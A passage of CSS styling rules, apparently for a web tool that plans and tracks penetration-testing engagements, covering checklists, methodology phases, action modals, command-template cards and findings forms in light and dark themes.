            border: 1px solid var(--border-color);
            border-radius: 6px;
        }

        .contact-entry select {
            padding: 6px 10px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            background: var(--bg-color);
            color: var(--text-color);
        }

        .remove-contact {
            background: var(--danger);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 6px 8px;
            cursor: pointer;
            font-size: 0.85em;
            transition: background-color 0.2s;
        }

        .remove-contact:hover {
            background: var(--danger)dd;
        }

        .add-another-contact {
            padding: 8px 16px;
            background: var(--border-color);
            color: var(--text-color);
            border: 1px dashed var(--border-color);
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9em;
            transition: all 0.2s;
            text-align: center;
        }

        .add-another-contact:hover {
            background: var(--surface-color);
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .scope-display {
            padding: 10px;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: var(--text-color);
        }

        .scope-stats {
            display: flex;
            gap: 20px;
            font-size: 0.9em;
        }

        .scope-stat {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .team-role-input {
            display: flex;
            gap: 10px;
            align-items: center;
            margin-bottom: 8px;
        }

        .team-role-input input[type="number"] {
            width: 60px;
            padding: 6px 8px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            background: var(--bg-color);
            color: var(--text-color);
        }

        .team-role-input label {
            flex: 1;
            font-weight: 500;
        }

        .question-notes {
            margin-top: 10px;
            padding-left: 34px;
        }

        .question-notes textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            background: var(--bg-color);
            color: var(--text-color);
            font-family: inherit;
            resize: vertical;
        }

        .question-notes textarea:focus {
            outline: none;
            border-color: var(--primary-color);
        }

        .free-text-input textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            background: var(--bg-color);
            color: var(--text-color);
            font-family: inherit;
            resize: vertical;
            min-height: 80px;
        }

        /* Free text question styling */
        .question-input textarea {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            background: var(--bg-color);
            color: var(--text-color);
            font-family: inherit;
            font-size: 0.95em;
            line-height: 1.5;
            resize: vertical;
            min-height: 100px;
            transition: all 0.2s;
        }

        .question-input textarea:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px var(--primary-color)22;
            background: white;
        }

        .question-input textarea::placeholder {
            color: var(--text-muted);
            font-style: italic;
            opacity: 0.8;
        }

        .free-text-container {
            position: relative;
        }

        .free-text-container textarea {
            background: var(--surface-color);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            padding: 15px 18px;
            font-size: 0.95em;
            line-height: 1.6;
            min-height: 120px;
            transition: all 0.3s ease;
        }

        .free-text-container textarea:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 4px var(--primary-color)11;
            background: white;
        }

        .free-text-container textarea:not(:placeholder-shown) {
            border-color: var(--success);
            background: var(--success)05;
        }

        /* Responsive checklist adjustments */
        @media (max-width: 768px) {
            .checklist-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .checklist-progress {
                align-self: stretch;
                justify-content: space-between;
            }

            .checklist-filters {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }

            .date-range-input {
                flex-direction: column;
                align-items: stretch;
            }

            .contact-input {
                flex-direction: column;
                align-items: stretch;
            }

            .team-role-input {
                flex-direction: column;
                align-items: stretch;
                gap: 5px;
            }

            .checklist-section-header {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }

            .section-progress {
                justify-content: space-between;
            }

            .scope-actions {
                flex-direction: column;
                gap: 15px;
                align-items: stretch;
            }

            .scope-actions .scope-btn {
                justify-content: center;
            }

            .scope-actions .approval-checkbox {
                justify-content: center;
            }

            .role-details {
                grid-template-columns: 1fr;
            }

            .contact-picker {
                flex-direction: column;
                align-items: stretch;
            }

            .add-contact-btn, .contact-link-btn {
                justify-content: center;
            }
        }

        /* Methodology Screen Styles */
        .methodology-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 20px 0 30px 0;
        }

        .stat-card {
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            transition: all 0.2s;
        }

        .stat-card:hover {
            border-color: var(--primary-color);
            transform: translateY(-2px);
        }

        .stat-number {
            font-size: 2em;
            font-weight: 700;
            color: var(--primary-color);
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 1em;
            font-weight: 600;
            color: var(--text-color);
            margin-bottom: 2px;
        }

        .stat-sublabel {
            font-size: 0.85em;
            color: var(--text-muted);
        }

        .methodology-controls {
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .methodology-phase {
            margin-bottom: 40px;
        }

        .phase-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--primary-color);
            color: white;
            padding: 15px 20px;
            border-radius: 8px 8px 0 0;
            margin-bottom: 0;
        }

        .phase-title {
            margin: 0;
            font-size: 1.2em;
            font-weight: 600;
        }

        .phase-progress {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .phase-progress .progress-text {
            font-size: 0.9em;
            color: white;
            opacity: 0.9;
        }

        .phase-progress .progress-bar {
            width: 100px;
            height: 6px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 3px;
        }

        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            padding: 20px;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-top: none;
            border-radius: 0 0 8px 8px;
        }

        .action-item {
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px;
            transition: all 0.2s;
            cursor: pointer;
        }

        .action-item:hover {
            border-color: var(--primary-color);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px var(--shadow-color);
        }

        .action-header {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            margin-bottom: 15px;
        }

        .action-status {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.1em;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .action-status.completed {
            background: var(--success)22;
            color: var(--success);
        }

        .action-status.in-progress {
            background: var(--warning)22;
            color: var(--warning);
        }

        .action-status.pending {
            background: var(--text-muted)22;
            color: var(--text-muted);
        }

        .action-status.blocked {
            background: var(--danger)22;
            color: var(--danger);
        }

        .action-info {
            flex: 1;
        }

        .action-title {
            margin: 0 0 5px 0;
            font-size: 1.1em;
            font-weight: 600;
            color: var(--text-color);
        }

        .action-description {
            margin: 0;
            font-size: 0.9em;
            color: var(--text-muted);
            line-height: 1.4;
        }

        .action-meta {
            display: flex;
            flex-direction: column;
            gap: 5px;
            align-items: flex-end;
            text-align: right;
        }

        .action-tool {
            font-size: 0.8em;
            color: var(--primary-color);
            font-weight: 500;
        }

        .action-time {
            font-size: 0.8em;
            color: var(--text-muted);
            background: var(--border-color);
            padding: 2px 8px;
            border-radius: 12px;
        }

        .action-details {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            gap: 15px;
        }

        .action-techniques {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            flex: 1;
        }

        .technique-tag {
            font-size: 0.75em;
            background: var(--border-color);
            color: var(--text-color);
            padding: 4px 8px;
            border-radius: 12px;
            font-weight: 500;
        }

        .action-findings {
            flex-shrink: 0;
        }

        .findings-badge {
            font-size: 0.8em;
            padding: 4px 10px;
            border-radius: 12px;
            font-weight: 600;
        }

        .findings-badge.success {
            background: var(--success)22;
            color: var(--success);
        }

        .action-progress-bar {
            width: 100%;
            height: 4px;
            background: var(--border-color);
            border-radius: 2px;
            overflow: hidden;
            margin-top: 10px;
        }

        .action-progress-bar .progress-fill {
            height: 100%;
            background: var(--warning);
            border-radius: 2px;
            transition: width 0.3s ease;
        }

        /* Responsive methodology adjustments */
        @media (max-width: 768px) {
            .methodology-stats {
                grid-template-columns: repeat(2, 1fr);
            }

            .actions-grid {
                grid-template-columns: 1fr;
                padding: 15px;
            }

            .action-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .action-meta {
                align-items: flex-start;
                text-align: left;
            }

            .action-details {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .phase-header {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }

            .phase-progress {
                justify-content: space-between;
            }
        }

        @media (max-width: 480px) {
            .methodology-stats {
                grid-template-columns: 1fr;
            }

            .actions-grid {
                padding: 10px;
            }
        }

        /* Action Modal Styles */
        #actionModalOverlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8) !important;
            display: none;
            z-index: 999999 !important;
            backdrop-filter: blur(4px);
        }

        .modal-overlay.show {
            display: flex !important;
            align-items: center;
            justify-content: center;
            visibility: visible !important;
            opacity: 1 !important;
        }

        .action-modal {
            background: white;
            color: var(--grey-700);
            border-radius: 12px;
            max-width: 90vw;
            max-height: 90vh;
            width: 1200px;
            display: flex;
            flex-direction: column;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            margin: 20px;
        }

        [data-theme="dark"] .action-modal {
            background: var(--grey-700);
            color: var(--grey-200);
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 20px 25px;
            background: var(--grey-100);
            border-bottom: 1px solid var(--grey-200);
        }

        [data-theme="dark"] .modal-header {
            background: var(--grey-800);
            border-bottom-color: #444;
        }

        .modal-title-section {
            flex: 1;
        }

        .modal-title {
            margin: 0 0 8px 0;
            font-size: 1.5em;
            font-weight: 600;
            color: var(--grey-700);
        }

        [data-theme="dark"] .modal-title {
            color: var(--grey-200);
        }

        .modal-subtitle {
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .action-category {
            font-size: 0.9em;
            font-weight: 500;
            color: #007bff;
        }

        [data-theme="dark"] .action-category {
            color: #66b3ff;
        }

        .action-status-badge {
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.8em;
            font-weight: 600;
        }

        .action-status-badge.in-progress {
            background: #ffc10722;
            color: #ffc107;
        }

        .action-status-badge.completed {
            background: #28a74522;
            color: #28a745;
        }

        .action-status-badge.pending {
            background: var(--grey-500)22;
            color: var(--grey-500);
        }

        [data-theme="dark"] .action-status-badge.in-progress {
            background: #ffca2833;
            color: #ffca28;
        }

        [data-theme="dark"] .action-status-badge.completed {
            background: #4caf5033;
            color: #4caf50;
        }

        [data-theme="dark"] .action-status-badge.pending {
            background: var(--grey-400)33;
            color: var(--grey-400);
        }

        .modal-close {
            background: none;
            border: none;
            font-size: 1.5em;
            cursor: pointer;
            color: var(--grey-500);
            padding: 5px;
            border-radius: 4px;
            transition: all 0.2s;
        }

        [data-theme="dark"] .modal-close {
            color: var(--grey-400);
        }

        .modal-close:hover {
            background: #dc354522;
            color: #dc3545;
        }

        [data-theme="dark"] .modal-close:hover {
            background: #f4433633;
            color: #f44336;
        }

        .modal-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-height: 0;
        }

        .modal-nav {
            display: flex;
            background: var(--grey-100);
            border-bottom: 2px solid #dee2e6;
            overflow-x: auto;
            scrollbar-width: thin;
            scrollbar-color: #999 #dee2e6;
        }

        [data-theme="dark"] .modal-nav {
            background: var(--grey-800);
            border-bottom-color: #444;
            scrollbar-color: #666 #333;
        }

        .modal-nav::-webkit-scrollbar {
            height: 6px;
        }

        .modal-nav::-webkit-scrollbar-track {
            background: var(--border-color);
        }

        .modal-nav::-webkit-scrollbar-thumb {
            background: var(--text-muted);
            border-radius: 3px;
        }

        .modal-nav-btn {
            background: none;
            border: none;
            padding: 12px 16px;
            cursor: pointer;
            font-size: 0.85em;
            font-weight: 500;
            color: var(--grey-500);
            border-bottom: 3px solid transparent;
            transition: all 0.2s;
            white-space: nowrap;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        [data-theme="dark"] .modal-nav-btn {
            color: var(--grey-400);
        }

        .modal-nav-btn:hover {
            background: var(--bg-primary);
            color: var(--text-primary);
        }

        [data-theme="dark"] .modal-nav-btn:hover {
            background: var(--dark-card-bg);
            color: var(--text-primary);
        }

        .modal-nav-btn.active {
            color: var(--accent-color);
            border-bottom-color: var(--accent-color);
            background: var(--bg-primary);
            font-weight: 600;
        }

        [data-theme="dark"] .modal-nav-btn.active {
            color: var(--accent-light);
            border-bottom-color: var(--accent-light);
            background: var(--dark-card-bg);
        }

        .modal-tab-content {
            flex: 1;
            overflow-y: auto;
            padding: var(--spacing-xl);
        }

        .modal-tab {
            display: none;
        }

        .modal-tab.active {
            display: block;
        }

        .tab-section {
            margin-bottom: var(--spacing-xl);
            padding-bottom: var(--spacing-lg);
            border-bottom: 1px solid var(--border-color);
        }

        [data-theme="dark"] .tab-section {
            border-bottom-color: var(--dark-border);
        }

        .tab-section:last-child {
            border-bottom: none;
        }

        .section-title {
            margin: 0 0 var(--spacing-lg) 0;
            font-size: var(--font-lg);
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            padding-bottom: var(--spacing-sm);
            border-bottom: 2px solid var(--accent-color);
        }

        [data-theme="dark"] .section-title {
            color: var(--text-primary);
            border-bottom-color: var(--accent-light);
        }

        .section-content {
            color: #666;
            line-height: 1.6;
            margin: 0;
            font-size: 0.95em;
        }

        [data-theme="dark"] .section-content {
            color: #b0b0b0;
        }

        /* Tool Information Styles */
        .tool-info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: var(--spacing-lg);
            align-items: stretch;
        }

        .tool-info-card {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-medium);
            padding: var(--spacing-lg);
            display: flex;
            flex-direction: column;
            min-height: 200px;
        }

        .tool-info-card h4 {
            margin: 0 0 var(--spacing-md) 0;
            font-size: var(--font-lg);
            color: var(--text-accent);
        }

        .tool-details {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .tool-detail {
            display: flex;
            justify-content: space-between;
        }

        .detail-label {
            font-weight: 500;
            color: var(--grey-700);
        }

        [data-theme="dark"] .detail-label {
            color: var(--grey-200);
        }

        .detail-value {
            color: #666;
            font-family: monospace;
        }

        [data-theme="dark"] .detail-value {
            color: #b0b0b0;
        }

        /* Command Templates Styles */
        .command-card {
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
            border-radius: 8px;
            margin-bottom: 20px;
            overflow: hidden;
        }

        [data-theme="dark"] .command-card {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }

        .command-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: white;
            border-bottom: 1px solid var(--grey-200);
        }

        [data-theme="dark"] .command-header {
            background: var(--grey-800);
            border-bottom-color: #444;
        }

        .command-header h4 {
            margin: 0;
            font-size: 1.1em;
            color: var(--grey-700);
        }

        [data-theme="dark"] .command-header h4 {
            color: var(--grey-200);
        }

        .copy-btn {
            padding: 6px 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.85em;
            transition: background-color 0.2s;
        }

        [data-theme="dark"] .copy-btn {
            background: #66b3ff;
        }

        .copy-btn:hover {
            background: #0056b3;
        }

        [data-theme="dark"] .copy-btn:hover {
            background: #4d94ff;
        }

        .command-template {
            padding: 20px;
            background: var(--grey-800);
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            margin: 0;
            border-left: 4px solid #007bff;
        }

        [data-theme="dark"] .command-template {
            border-left-color: #66b3ff;
        }

        .command-template code {
            color: #4fc1ff;
            font-size: 0.95em;
            background: none;
            padding: 0;
            line-height: 1.4;
        }

        [data-theme="dark"] .command-template code {
            color: #7dd3fc;
        }

        .command-description {
            padding: 10px 20px;
            font-size: 0.9em;
            color: var(--grey-500);
        }

        [data-theme="dark"] .command-description {
            color: var(--grey-400);
        }

        .command-placeholders {
            padding: 10px 20px;
            background: #ffc10711;
            border-left: 3px solid #ffc107;
            font-size: 0.85em;
            color: var(--grey-700);
        }

        [data-theme="dark"] .command-placeholders {
            background: #ffca2811;
            border-left-color: #ffca28;
            color: var(--grey-200);
        }

        .placeholder-tag {
            background: #ffc10722;
            color: #ffc107;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: monospace;
            font-weight: 600;
        }

        [data-theme="dark"] .placeholder-tag {
            background: #ffca2833;
            color: #ffca28;
        }

        .modal-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: var(--spacing-lg) var(--spacing-xl);
            background: var(--bg-secondary);
            border-top: 1px solid var(--border-color);
        }

        [data-theme="dark"] .modal-footer {
            background: var(--dark-bg);
            border-top-color: var(--dark-border);
        }

        .modal-footer-left,
        .modal-footer-right {
            display: flex;
            gap: var(--spacing-sm);
            align-items: center;
        }

        .status-btn {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: 500;
            transition: all 0.2s;
        }

        .status-btn.in-progress {
            background: linear-gradient(135deg, #ffc10722, #ffc10711);
            color: #ffc107;
            border: 1px solid #ffc10744;
        }

        [data-theme="dark"] .status-btn.in-progress {
            background: linear-gradient(135deg, #ffca2822, #ffca2811);
            color: #ffca28;
            border-color: #ffca2844;
        }

        .status-btn.in-progress:hover {
            background: #ffc107;
            color: white;
        }

        [data-theme="dark"] .status-btn.in-progress:hover {
            background: #ffca28;
        }

        .status-btn.completed {
            background: linear-gradient(135deg, #28a74522, #28a74511);
            color: #28a745;
            border: 1px solid #28a74544;
        }

        [data-theme="dark"] .status-btn.completed {
            background: linear-gradient(135deg, #4caf5022, #4caf5011);
            color: #4caf50;
            border-color: #4caf5044;
        }

        .status-btn.completed:hover {
            background: #28a745;
            color: white;
        }

        [data-theme="dark"] .status-btn.completed:hover {
            background: #4caf50;
        }

        .secondary-btn {
            padding: 10px 20px;
            background: #dee2e6;
            color: var(--grey-700);
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
        }

        [data-theme="dark"] .secondary-btn {
            background: #444;
            color: var(--grey-200);
        }

        .secondary-btn:hover {
            background: #6c757d;
            color: white;
        }

        [data-theme="dark"] .secondary-btn:hover {
            background: #555;
        }

        .primary-btn {
            padding: 10px 20px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.2s;
        }

        [data-theme="dark"] .primary-btn {
            background: #66b3ff;
        }

        .primary-btn:hover {
            background: #0056b3;
        }

        [data-theme="dark"] .primary-btn:hover {
            background: #4d94ff;
        }

        /* Additional Modal Component Styles */
        .techniques-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }

        .technique-card {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-medium);
            padding: var(--spacing-md);
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
            min-height: 140px;
        }

        .technique-card:hover {
            border-color: var(--text-accent);
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }

        .technique-card h4 {
            margin: 0 0 var(--spacing-sm) 0;
            color: var(--text-accent);
            font-size: var(--font-base);
            font-weight: 600;
        }

        .technique-card p {
            margin: 0 0 var(--spacing-sm) 0;
            font-size: var(--font-sm);
            color: var(--text-secondary);
            line-height: 1.5;
            flex-grow: 1;
        }

        .technique-tags {
            display: flex;
            gap: var(--spacing-xs);
            flex-wrap: wrap;
        }

        .tag {
            background: var(--accent-color)22;
            color: var(--accent-color);
            padding: var(--spacing-xs) var(--spacing-sm);
            border-radius: var(--radius-pill);
            font-size: var(--font-xs);
            font-weight: 500;
        }

        [data-theme="dark"] .tag {
            background: var(--accent-color)33;
            color: var(--accent-light);
        }

        .outcomes-list {
            display: flex;
            flex-direction: column;
            gap: var(--spacing-md);
        }

        .outcome-item {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            padding: var(--spacing-md);
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-small);
        }

        [data-theme="dark"] .outcome-item {
            background: var(--dark-card-bg);
            border-color: var(--dark-border);
        }

        .outcome-icon {
            font-size: 1.2em;
            flex-shrink: 0;
        }

        /* Media Tab Styles */
        .media-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: var(--spacing-lg);
        }

        .media-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-medium);
            overflow: hidden;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: var(--shadow-sm);
        }

        [data-theme="dark"] .media-card {
            background: var(--dark-card-bg);
            border-color: var(--dark-border);
        }

        .media-card:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow);
            border-color: var(--accent-color);
        }

        [data-theme="dark"] .media-card:hover {
            border-color: var(--accent-light);
        }

        .media-thumbnail {
            position: relative;
            height: 180px;
            overflow: hidden;
        }

        .media-thumbnail img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: var(--spacing-md);
            border-radius: var(--radius-pill);
            font-size: 1.5em;
        }

        .media-info {
            padding: var(--spacing-md);
        }

        .media-info h4 {
            margin: 0 0 8px 0;
            color: var(--grey-700);
        }

        [data-theme="dark"] .media-info h4 {
            color: var(--grey-200);
        }

        .media-info p {
            margin: 0 0 10px 0;
            font-size: 0.9em;
            color: var(--grey-500);
        }

        [data-theme="dark"] .media-info p {
            color: var(--grey-400);
        }

        .media-meta {
            display: flex;
            gap: 15px;
        }

        .duration, .difficulty {
            font-size: 0.8em;
            padding: 3px 8px;
            border-radius: 10px;
        }

        .duration {
            background: #007bff22;
            color: #007bff;
        }

        [data-theme="dark"] .duration {
            background: #66b3ff33;
            color: #66b3ff;
        }

        .difficulty {
            background: #ffc10722;
            color: #ffc107;
        }

        [data-theme="dark"] .difficulty {
            background: #ffca2833;
            color: #ffca28;
        }

        .docs-links {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .doc-link {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 15px;
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
            border-radius: 6px;
            text-decoration: none;
            color: var(--grey-700);
            transition: all 0.2s;
        }

        [data-theme="dark"] .doc-link {
            background: var(--grey-700);
            border-color: var(--grey-600);
            color: var(--grey-200);
        }

        .doc-link:hover {
            border-color: #007bff;
            transform: translateX(5px);
        }

        [data-theme="dark"] .doc-link:hover {
            border-color: #66b3ff;
        }

        .doc-icon {
            font-size: 1.1em;
        }

        .external-icon {
            margin-left: auto;
            color: var(--grey-500);
        }

        [data-theme="dark"] .external-icon {
            color: var(--grey-400);
        }

        /* Troubleshooting Styles */
        .issue-accordion {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .issue-item {
            border: 1px solid var(--grey-200);
            border-radius: 8px;
            overflow: hidden;
            margin-bottom: 12px;
            transition: all 0.2s;
        }

        [data-theme="dark"] .issue-item {
            border-color: var(--grey-600);
        }

        .issue-item:hover {
            border-color: #007bff;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        }

        [data-theme="dark"] .issue-item:hover {
            border-color: #66b3ff;
        }

        .issue-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 20px;
            background: var(--grey-100);
            cursor: pointer;
            transition: all 0.2s;
        }

        [data-theme="dark"] .issue-header {
            background: var(--grey-700);
        }

        .issue-header:hover {
            background: linear-gradient(to right, #f8f9fa, white);
        }

        [data-theme="dark"] .issue-header:hover {
            background: linear-gradient(to right, #333, #2a2a2a);
        }

        .issue-header h4 {
            margin: 0;
            font-size: 1em;
            color: var(--grey-700);
        }

        [data-theme="dark"] .issue-header h4 {
            color: var(--grey-200);
        }

        .issue-toggle {
            font-size: 1.2em;
            color: var(--grey-500);
            font-weight: bold;
        }

        [data-theme="dark"] .issue-toggle {
            color: var(--grey-400);
        }

        .issue-content {
            display: none;
            padding: 15px;
            background: white;
            color: var(--grey-700);
        }

        [data-theme="dark"] .issue-content {
            background: var(--grey-700);
            color: var(--grey-200);
        }

        .issue-solution ul {
            margin: 10px 0;
            padding-left: 20px;
        }

        .issue-solution code {
            background: var(--grey-100);
            color: var(--grey-700);
            padding: 2px 5px;
            border-radius: 3px;
            font-family: monospace;
        }

        [data-theme="dark"] .issue-solution code {
            background: var(--grey-800);
            color: var(--grey-200);
        }

        .risk-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }

        .risk-card {
            border: 1px solid;
            border-radius: 6px;
            padding: 15px;
        }

        .risk-card.high {
            border-color: #dc3545;
            background: #dc354511;
            color: var(--grey-700);
        }

        [data-theme="dark"] .risk-card.high {
            border-color: #f44336;
            background: #f4433611;
            color: var(--grey-200);
        }

        .risk-card.medium {
            border-color: #ffc107;
            background: #ffc10711;
            color: var(--grey-700);
        }

        [data-theme="dark"] .risk-card.medium {
            border-color: #ffca28;
            background: #ffca2811;
            color: var(--grey-200);
        }

        .risk-card.low {
            border-color: #28a745;
            background: #28a74511;
            color: var(--grey-700);
        }

        [data-theme="dark"] .risk-card.low {
            border-color: #4caf50;
            background: #4caf5011;
            color: var(--grey-200);
        }

        .risk-level {
            font-size: 0.8em;
            font-weight: 600;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        .risk-card.high .risk-level {
            color: #dc3545;
        }

        [data-theme="dark"] .risk-card.high .risk-level {
            color: #f44336;
        }

        .risk-card.medium .risk-level {
            color: #ffc107;
        }

        [data-theme="dark"] .risk-card.medium .risk-level {
            color: #ffca28;
        }

        .risk-card.low .risk-level {
            color: #28a745;
        }

        [data-theme="dark"] .risk-card.low .risk-level {
            color: #4caf50;
        }

        /* Findings Tab Styles */
        .findings-section {
            margin-bottom: 30px;
        }

        .findings-section h4 {
            margin: 0 0 15px 0;
            color: var(--grey-700);
        }

        [data-theme="dark"] .findings-section h4 {
            color: var(--grey-200);
        }

        .finding-templates {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .finding-template {
            border: 1px solid var(--grey-200);
            border-radius: 8px;
            overflow: hidden;
        }

        [data-theme="dark"] .finding-template {
            border-color: var(--grey-600);
        }

        .template-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            background: var(--grey-100);
        }

        [data-theme="dark"] .template-header {
            background: var(--grey-700);
        }

        .template-header h5 {
            margin: 0;
            color: var(--grey-700);
        }

        [data-theme="dark"] .template-header h5 {
            color: var(--grey-200);
        }

        .severity {
            padding: 4px 10px;
            border-radius: 10px;
            font-size: 0.8em;
            font-weight: 600;
        }

        .severity.critical {
            background: #dc354522;
            color: #dc3545;
        }

        [data-theme="dark"] .severity.critical {
            background: #f4433633;
            color: #f44336;
        }

        .severity.high {
            background: #dc354522;
            color: #dc3545;
        }

        [data-theme="dark"] .severity.high {
            background: #f4433633;
            color: #f44336;
        }

        .severity.medium {
            background: #ffc10722;
            color: #ffc107;
        }

        [data-theme="dark"] .severity.medium {
            background: #ffca2833;
            color: #ffca28;
        }

        .severity.low {
            background: #28a74522;
            color: #28a745;
        }

        [data-theme="dark"] .severity.low {
            background: #4caf5033;
            color: #4caf50;
        }

        .use-template-btn {
            padding: 6px 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.85em;
        }

        [data-theme="dark"] .use-template-btn {
            background: #66b3ff;
        }

        .template-preview {
            padding: 15px;
            font-size: 0.9em;
            color: var(--grey-700);
        }

        [data-theme="dark"] .template-preview {
            color: var(--grey-200);
        }

        .add-finding-form {
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
            border-radius: 8px;
            padding: 20px;
        }

        [data-theme="dark"] .add-finding-form {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }

        .form-row {
            display: flex;
            gap: 15px;
            margin-bottom: 15px;
        }

        .finding-input {
            flex: 2;
            padding: 10px;
            border: 1px solid var(--grey-200);
            border-radius: 4px;
            background: white;
            color: var(--grey-700);
        }

        [data-theme="dark"] .finding-input {
            border-color: var(--grey-600);
            background: var(--grey-700);
            color: var(--grey-200);
        }

        .severity-select {
            flex: 1;
            padding: 10px;
            border: 1px solid var(--grey-200);
            border-radius: 4px;
            background: white;
            color: var(--grey-700);
        }

        [data-theme="dark"] .severity-select {
            border-color: var(--grey-600);
            background: var(--grey-700);
            color: var(--grey-200);
        }

        .finding-description {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--grey-200);
            border-radius: 4px;
            background: white;
            color: var(--grey-700);
            min-height: 80px;
            margin-bottom: 15px;
        }

        [data-theme="dark"] .finding-description {
            border-color: var(--grey-600);
            background: var(--grey-700);
            color: var(--grey-200);
        }

        .form-actions {
            display: flex;
            gap: 10px;
        }

        .add-finding-btn, .save-template-btn {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }

        .add-finding-btn {
            background: #28a745;
            color: white;
        }

        [data-theme="dark"] .add-finding-btn {
            background: #4caf50;
        }

        .save-template-btn {
            background: #dee2e6;
            color: var(--grey-700);
        }

        [data-theme="dark"] .save-template-btn {
            background: #555;
            color: var(--grey-200);
        }

        .current-findings {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .finding-item {
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
